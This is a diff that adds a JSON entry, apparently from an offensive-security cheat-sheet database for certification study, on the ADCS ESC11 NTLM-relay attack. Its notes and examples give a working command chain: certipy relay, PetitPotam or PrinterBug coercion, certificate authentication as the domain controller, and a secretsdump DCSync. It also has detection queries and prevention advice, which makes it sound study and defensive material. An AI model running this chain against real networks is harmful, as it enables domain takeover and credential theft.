@@ -1,0 +1,103 @@
+{
+  "id": "ad-adcs-esc11-rpc-relay",
+  "name": "ADCS ESC11 - NTLM Relay to CA via ICertPassage RPC",
+  "command": "certipy relay -ca <ca_hostname>",
+  "description": "ESC11 abuses the ICertPassage RPC interface on the CA, which lacks Extended Protection for Authentication (EPA). Coerce NTLM auth from a machine (PetitPotam/PrinterBug) and relay it to the CA's RPC endpoint to request a certificate as that machine account. No web enrollment needed.",
+  "platform": "linux",
+  "type": "attack-chain",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "ADCS Attacks",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "certipy v4.8+ ESC11 research",
+  "tags": [
+    "adcs",
+    "esc11",
+    "icertpassage",
+    "rpc",
+    "ntlm-relay",
+    "certipy",
+    "pki"
+  ],
+  "mitre": [
+    "T1649",
+    "T1557"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE IDEA ===\nThe CA's ICertPassage RPC interface does not enforce EPA by default.\nCoerce NTLM auth from a DC (PetitPotam/PrinterBug) and relay it\ndirectly to the CA via RPC - no web enrollment (ESC8) needed.\n\n=== ATTACK CHAIN ===\n  # Terminal 1: Start certipy relay listening on the CA\n  certipy relay -ca ca01.corp.local\n\n  # Terminal 2: Coerce DC authentication\n  python3 PetitPotam.py <attacker_ip> <dc_ip>\n  # or: python3 printerbug.py corp.local/user:pass@<dc_ip> <attacker_ip>\n\n  # certipy will catch the relay and request a cert as DC$\n  # Output: dc01.pfx\n\n  # Step 3: Authenticate with the DC certificate\n  certipy auth -pfx dc01.pfx -dc-ip <dc_ip>\n\n  # Step 4: DCSync with the NT hash\n  secretsdump.py -hashes :<nt_hash> corp.local/dc01$@<dc_ip>\n\n=== DIFFERENCE FROM ESC8 ===\n- ESC8 targets the web enrollment HTTP endpoint (certsrv)\n- ESC11 targets the RPC interface (ICertPassage)\n- ESC11 works even if web enrollment is disabled\n- Both require NTLM relay (no EPA enforcement)\n\n=== REQUIREMENTS ===\n- CA without EPA on ICertPassage RPC interface\n- NTLM coercion method (PetitPotam, PrinterBug, ShadowCoerce)\n- Machine template allowing enrollment",
+  "examples": [
+    {
+      "label": "Start certipy relay for ESC11",
+      "command": "certipy relay -ca ca01.corp.local"
+    },
+    {
+      "label": "Coerce DC auth with PetitPotam",
+      "command": "python3 PetitPotam.py 10.10.14.5 192.168.1.10"
+    },
+    {
+      "label": "Authenticate with DC cert",
+      "command": "certipy auth -pfx dc01.pfx -dc-ip 192.168.1.10"
+    }
+  ],
+  "references": [
+    {
+      "title": "Certipy - ESC11",
+      "url": "https://github.com/ly4k/Certipy"
+    },
+    {
+      "title": "ADCS ESC11 Research",
+      "url": "https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-petitpotam",
+      "note": "PetitPotam provides the NTLM coercion needed for ESC11.",
+      "rel": "prereq"
+    },
+    {
+      "id": "ad-adcs-esc4-template-acl",
+      "note": "ESC4 is a template-based attack; ESC11 is relay-based.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "The ICertPassage RPC interface on the CA accepts NTLM authentication without Extended Protection for Authentication (EPA), allowing relayed credentials to request certificates.",
+    "prerequisites": "CA without EPA on RPC interface; NTLM coercion method; machine template.",
+    "impact": "Certificate as any machine account whose NTLM auth is coerced - typically the DC, leading to DCSync.",
+    "detection": "[MITRE T1649] NTLM authentication to CA from unexpected sources; certificate requests for machine accounts not originating from those machines.",
+    "artifacts": "Event 4768/4769 (Kerberos ticket requests with certificate); NTLM relay traffic to CA; Event 4886/4887.",
+    "splunk_spl": "index=wineventlog EventCode=4887 TemplateName=\"Machine\"\n| where RequesterName!=dns_hostname\n| table _time, RequesterName, SubjectName",
+    "elastic_kql": "event.code:\"4887\" AND winlog.event_data.TemplateName:\"Machine\"",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4887\n| where CertificateTemplate == \"Machine\"\n| project TimeGenerated, RequesterName, SubjectName",
+    "sigma_rules": "win_adcs_esc11_rpc_relay",
+    "prevention": "Enable EPA on the CA's RPC interface; enforce LDAP signing; restrict NTLM authentication via GPO.",
+    "sources": [
+      "https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/",
+      "https://attack.mitre.org/techniques/T1649/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "ESC11 - Machine certificate request via RPC relay",
+        "logic": "SecurityEvent\n| where EventID == 4887\n| where CertificateTemplate contains \"Machine\"\n| project TimeGenerated, RequesterName, SubjectName, CertificateTemplate",
+        "data_source": "windows-security",
+        "log_ids": [
+          "4887"
+        ],
+        "attack": [
+          "T1649",
+          "T1557"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Auto-enrollment of machine certificates by legitimate systems",
+        "tuning": "Compare requester source IP with the machine account's known IP"
+      }
+    ]
+  }
+}
